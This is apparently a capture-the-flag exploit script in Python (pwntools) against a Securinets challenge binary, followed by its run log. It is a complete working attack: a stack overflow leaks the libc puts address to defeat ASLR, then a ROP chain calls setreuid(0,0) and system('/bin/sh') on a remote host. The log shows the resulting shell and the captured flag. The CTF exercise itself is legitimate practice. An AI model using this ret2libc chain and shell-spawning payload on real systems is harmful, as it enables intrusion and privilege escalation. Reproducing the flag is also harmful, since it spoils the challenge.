#!/usr/bin/env python

from pwn import *

context.arch = "x86_64" # i forgot this for a while and was getting some craziness with my rop chain -.-
get_flag = True
chall_name = 'welc'

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main
    b *main+67
    b *_start''')

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)

    """
    A classic stack overflow. The binary has no stack canaries or PIE, 
    we assume ASLR enabled because we get a libc file with the challenge.
    
    First, leak the address of puts in libc, to do this we dont need a leak
    because without PIE we know wheres everything in the binary. 
    With the leak, we can have anything from libc, so we restart the binary
    (because we need to get the leak and use the leak in a second overflow),
    and ret2libc to call system('/bin/sh') or whatever we want.
    """
        
    binary = ELF(chall_name)
    puts_plt = p64(binary.symbols['puts']) # getting puts address from @plt
    puts_got = p64(0x40106b + 0x2fad) # puts rip when in plt + offset of indirect jmp, should point to puts inside libc
    start_addr = p64(binary.symbols['_start']) # getting _start main

    # searching for ROP gadgets, this 'rop' object will be useful ahead too
    rop = ROP('./' + chall_name)
    pop_rdi = p64(rop.rdi.address)

    ##### STAGE 1 - LEAKING LIBC PUTS ADDRESS AND BYPASS ASLR #######
    overflow_until_ret = b'A' * cyclic_find('raaaaaaa', n=8)

    """
    Here we create a rop chain in the 'old way'
    """
    xpl = b''
    xpl += overflow_until_ret
    # leaking puts libc address by using puts
    xpl += pop_rdi + puts_got # putting in rdi the addrs for puts from the got, the libc resolved guy
    xpl += puts_plt # puts plt addrs used to print the address in puts_got, leaking puts from libc
    xpl += start_addr # calling _start to rerun the binary and overflow again with something more useful
    
    print(p.recvrepeat(1).decode())
    p.sendline(xpl)

    memory_leak = p.recvline().strip()
    puts_leak = u64(memory_leak.ljust(8, b"\x00")) # adjusting the leak
    # calculating and setting libc base
    libc = ELF('libc.so.6') # chante to remote version
    puts_libc_offset = libc.sym.puts
    libc_base = puts_leak - puts_libc_offset # calculating the base with the leak
    libc.address = libc_base # setting the base for our object
    # now we can get address easily like this
    print('Leaked puts', hex(puts_leak))
    print('System address', hex(libc.sym.system))
    print('/bin/sh address', hex(next(libc.search(b'/bin/sh'))))

    ##### STAGE 2 - PWWWNINGGG #######
    """
    Here we create a rop chain using the power of pwntools
    """
    # i need a empty ret address here because the movaps instrunction in system will trigger
    # a sigsev because of the ABI rule. The rule says that the stack has to be aligned to 16 bytes
    # before doing a call (more research needed on this)
    # https://newbedev.com/why-does-the-mac-abi-require-16-byte-stack-alignment-for-x86-32
    rop.raw(rop.ret.address)
    rop.call(libc.sym.setreuid, [0, 0])
    rop.call(libc.sym.system, [next(libc.search(b'/bin/sh'))])
    print(rop.dump())

    input('Press enter to pwn...')
    print(p.recvrepeat(1).decode())

    p.sendline(overflow_until_ret + rop.chain())
    print('Enjoy the shell')
    p.interactive()
    p.close()

if get_flag:
    p = remote('20.216.39.14', '1237')
    run_exploit(p, False)
else:
    process_full_path = './' + chall_name
    p = process(process_full_path)
    run_exploit(p, False)

"""
b@vbm ~/c/s/pwn1> python3 xpl.py
[+] Opening connection to 20.216.39.14 on port 1237: Done
[*] '/home/b/ctf/securinets/pwn1/welc'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './welc'
Zied likes degla b zbib ! what about you ?

[*] '/home/b/ctf/securinets/pwn1/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Leaked puts 0x7f4b74d56450
System address 0x7f4b74d242c0
/bin/sh address 0x7f4b74e865bd
0x0000:         0x40101a ret
0x0008:         0x401283 pop rdi; ret
0x0010:              0x0 [arg0] rdi = 0
0x0018:         0x401281 pop rsi; pop r15; ret
0x0020:              0x0 [arg1] rsi = 0
0x0028:      b'kaaalaaa' <pad r15>
0x0030:   0x7f4b74de6980
0x0038:         0x401283 pop rdi; ret
0x0040:   0x7f4b74e865bd [arg0] rdi = 139962060662205
0x0048:   0x7f4b74d242c0
Press enter to pwn...
Zied likes degla b zbib ! what about you ?

Enjoy the shell
[*] Switching to interactive mode
$ ls
flag.txt
welc
ynetd
$ cat flag.txt
Securinets{5d91d2e01b854fd457c1d8b592a19b38af6b4a33c6362b7d}
"""
